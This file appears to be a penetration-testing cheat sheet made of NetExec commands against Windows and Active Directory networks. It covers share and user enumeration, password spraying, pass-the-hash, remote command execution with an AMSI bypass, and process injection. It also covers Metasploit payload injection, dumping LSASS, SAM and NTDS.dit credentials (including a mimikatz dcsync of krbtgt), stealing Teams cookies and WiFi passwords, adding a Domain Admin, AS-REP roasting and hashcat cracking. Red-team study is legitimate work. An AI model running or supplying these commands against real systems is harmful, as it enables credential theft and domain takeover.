#!/bin/sh


##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##     [+] NetExec - Network Execution Framework:
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##




##-=================================================-##
##   [+] NetExec - Enumerate SMB Shares on Subnet:
##-=================================================-##
nxc smb $IP/24


##-=============================================-##
##   [+] NetExec - Enumerate Logged on Users:
##-=============================================-##
nxc smb $IP/24 -u $User -p '$Pass' --loggedon-users


##-=================================================-##
##   [+] NetExec - Enumerate Disks on Remote Host:
##-=================================================-##
nxc smb $IP/24 -u $User -p '$Pass' --disks


##-======================================================-##
##   [+] NetExec - Enumerate Permissions on SMB Shares
##-======================================================-##
nxc smb $IP/24 -u $User -p '$Pass' --shares


##-=============================================-##
##   [+] NetExec - Filter Read/Write Shares:
##-=============================================-##
nxc smb $IP/24 -u $User -p '$Pass' --shares --filter-shares READ WRITE


##-=============================================-##
##   [+] NetExec - Enumerate Active Sessions:
##-=============================================-##
nxc smb $IP/24 -u $User -p '$Pass' --sessions


##-===================================================================-##
##   [+] NetExec - Null Sessions - Enumerate Domain Password Policy:
##-===================================================================-##
nxc smb $IP/24 -u $User -p '' --pass-pol


##-===============================================-##
##   [+] NetExec - Enumerate User Null Sessions:
##-===============================================-##
nxc smb $IP/24 -u $User -p '' --users


##-===========================================-##
##   [+] NetExec - Enumerate Domain Groups:
##-===========================================-##
nxc smb $IP/24 -u $User -p '$Pass' --groups


##-==========================================-##
##   [+] NetExec - Enumerate Local Groups:
##-==========================================-##
nxc smb $IP/24 -u $User -p '$Pass' --local-group


##-=====================================================================-##
##   [+] NetExec - Enumerate Users By Bruteforcing RID on Remote Host:
##-=====================================================================-##
nxc smb $IP/24 -u $User -p '$Pass' --rid-brute


##-=============================================-##
##   [+] NetExec - Enumerate Anti-Virus & EDR:
##-=============================================-##
nxc smb $IP/24 -u $User -p '$Pass' -M enum_av


##-================================================================================-##
##   [+] NetExec - Password Spraying - Bruteforce Using User List with Password:
##-================================================================================-##
nxc smb $IP -u $UserList.txt -p '$Pass'
nxc smb $IP -u $UserList.txt -p '$Pass' --continue-on-success


##-===========================================================================-##
##   [+] NetExec - Password Spraying - Bruteforce User Using Password List:
##-===========================================================================-##
nxc smb $IP -u $User -p /$Dir/$PassList.txt


##-================================================================================-##
##   [+] NetExec - Password Spraying - Bruteforce Users & Passwords Using Lists:
##-================================================================================-##
nxc smb $IP -u $UserList.txt -p /$Dir/$PassList.txt
nxc smb $IP -u $UserList.txt -p /$Dir/$PassList.txt --continue-on-success

##-============================================================-##
##   [+] NetExec - Checking Credentials Using An LM:NT Hash:
##-============================================================-##
nxc smb $IP -u $User -H 'LM:NT'


##-=========================================================-##
##   [+] NetExec - Checking Credentials Using An NT Hash:
##-=========================================================-##
nxc smb $IP -u $User -H 'NTHASH'


##-====================================================-##
##   [+] NetExec - Checking Credentials Using A Hash:
##-====================================================-##
nxc smb $IP -u Administrator -H '$Hash'


##-================================================-##
##   [+] NetExec - Checking (Local) Credentials:
##-================================================-##
nxc smb $IP/24 -u $User -p '$Pass' --local-auth
nxc smb $IP/24 -u '' -p '' --local-auth
nxc smb $IP/24 -u $User -H 'LM:NT' --local-auth
nxc smb $IP/24 -u $User -H 'NTHASH' --local-auth
nxc smb $IP/24 -u $User -H '$Hash' --local-auth


##-=====================================-##
##   [+] NetExec - Command Execution:
##-=====================================-##
nxc smb $IP -u Administrator -p '$Pass' -X '$PSVersionTable'
nxc smb $IP -u Administrator -p '$Pass' -X '$PSVersionTable' --amsi-bypass /$Dir/$Payload
nxc smb $IP -u Administrator -p '$Pass' -X whoami


##-================================================-##
##   [+] NetExec - Process Injection - PI Module:
##-================================================-##
nxc smb $IP -u $User -p '$Pass' -M pi -o PID=$PID EXEC=$Command


##-=====================================-##
##   [+] NetExec - Metasploit Module:
##-=====================================-##
NetExec $IP/24 -u $User -p '$Pass' -M empire_exec -o LISTENER=
NetExec $IP/24 -u $User -p '$Pass' -M met_inject -o SRVHOST=$IP SRVPORT=$Port RAND=$Rand SSL=http


##-========================================================-##
##   [+] NetExec - Spidering Shares + Spider Plus Module:
##-========================================================-##
nxc SMB $IP -u $User -p $Pass --spider C\$ --pattern txt
nxc SMB $IP -u $User -p $Pass -M spider_plus


##-=================================================================-##
##   [+] NetExec - Spidering Shares - Dumping All Spidered Files:
##-=================================================================-##
nxc SMB $IP -u $User -p $Pass -M spider_plus -o DOWNLOAD_FLAG=True


##-============================================-##
##   [+] NetExec - Send Local File to Target:
##-============================================-##
nxc smb $IP -u $User -p '$Pass' --put-file /$Dir/$File \\Windows\Temp\\whoami.txt


##-===============================================-##
##   [+] NetExec - Get File From Remote Target:
##-===============================================-##
nxc smb $IP -u $User -p '$Pass' --get-file \\Windows\Temp\\whoami.txt


##-===============================================================-##
##   [+] NetExec - LSASS Module - Dump Remote LSASS Credentials:
##-===============================================================-##
nxc smb $IP -u $User -p '$Pass' -M lsassy


##-==================================================================-##
##   [+] NetExec - NanoDump Module - Dump Remote LSASS Credentials:
##-==================================================================-##
nxc smb $IP -u $User -p '$Pass' -M nanodump


##-===================================================================-##
##   [+] NetExec - MimiKatz Module - Dump Remote LSASS Credentials:
##-===================================================================-##
nxc smb $IP -u Administrator -p '$Pass' -M mimikatz
nxc smb $IP -u Administrator -p '$Pass' -M mimikatz -o COMMA="lsadump::dcsync /domain:domain.local /user:krbtgt"


##-=========================================================================-##
##   [+] NetExec - LSA Secrets - Dump LSA Secrets - Using SecretsDump.py:
##-=========================================================================-##
nxc smb $IP/24 -u $User -p '$Pass' --lsa


##-====================================================================-##
##   [+] NetExec - SAM Hashes - Dump SAM Hash - Using SecretsDump.py:
##-====================================================================-##
nxc smb $IP/24 -u $User -p '$Pass' --sam


##-==========================================================-##
##   [+] NetExec - Dump WiFi Password Register in Windows:
##-==========================================================-##
nxc smb $IP -u $User -p '$Pass' -M wireless


##-=================================================================-##
##   [+] NetExec - SecretsDump.py - Dump NTDS.dit (From Target DC) 
##-=================================================================-##
nxc smb $IP -u $User -p '$Pass' --ntds
nxc smb $IP -u $User -p '$Pass' --ntds --users
nxc smb $IP -u $User -p '$Pass' --ntds --users --enabled
nxc smb $IP -u $User -p '$Pass' --ntds vss


##-=========================================================================-##
##   [+] NetExec - NTDS Module - Dump NTDS.dit & SYSTEM Hive Credentials:
##-=========================================================================-##
nxc smb $IP -u $User -p '$Pass' -M ntdsutil


##-=======================================================-##
##   [+] NetExec - Check if Spooler Service is Running:
##-=======================================================-##
nxc smb $IP -u $User -p '$Pass' -M spooler


##-=====================================================-##
##   [+] NetExec - Check if WebDav Service is Running:
##-=====================================================-##
nxc smb $IP -u $User -p '$Pass' -M webdav


##-================================================-##
##   [+] NetExec - Steal Microsoft Teams Cookies:
##-================================================-##
nxc smb $IP -u $User -p '$Pass' -M teams_localdb


##-===============================================================-##
##   [+] NetExec - Execute Commands - on Behalf of Other Users:
##-===============================================================-##
nxc smb $IP -u $LocalAdmin -p $Pass -M schtak_as -o USER=$LoggedInUser CMD=$CmdCommand


##-=====================================================-##
##   [+] PowerShell - Add User To Domain Admin Group:
##-=====================================================-##
powershell.exe \"Invoke-Command -ComputerName DC01 -Script-Block {Add-ADGroupMember -Identify 'Domain Admins' -Members USER.NAME}\"


##-========================================================================-##
##   [+] NetExec - Testing if Account Exists - Without Kerberos Protocol:
##-========================================================================-##
nxc ldap $IP/24 -u $UserList.txt -p '' -k 


##-==================================================-##
##   [+] NetExec - LDAP - Testing LDAP Credentials:
##-==================================================-##
nxc ldap $IP/24 -u $User -p '$Pass'


##-========================================-##
##   [+] NetExec - LDAP - Test LDAP Hash:
##-========================================-##
nxc ldap $IP/24 -u $User -H '$Hash'


##-================================================-##
##   [+] NetExec - 
##-================================================-##
nxc ldap $IP -u $User -p '$Pass' --users 


##-================================================-##
##   [+] NetExec - 
##-================================================-##
nxc ldap $IP -u $User -p '$Pass' --active-users


##-===================================================================================-##
##   [+] NetExec - LDAP - Kerberos - ASREPRoast - Test Sessions With Authentication:
##-===================================================================================-##
nxc ldap $IP -u $User -p '$Pass' --asreproast $File.txt


##-=============================================================================-##
##   [+] NetExec - LDAP - Kerberos - ASREPRoast - Test Sessions Without Auth:
##-=============================================================================-##
nxc ldap $IP -u $User -p '' --asreproast $File.txt
nxc ldap $IP -u $UserList.txt -p '' --asreproast $File.txt


##-=============================================================================-##
##   [+] NetExec - LDAP - Kerberos - ASREPRoast - KDCHost - Use If DNS Fails:
##-=============================================================================-##
nxc ldap $IP -u $User -p '$Pass' --asreproast $File.txt --kdcHost domain_name


##-=========================================-##
##   [+] HashCat - Crack Kerberos Hashes:
##-=========================================-##
hashcat -m18200 $Output.txt $Wordlist




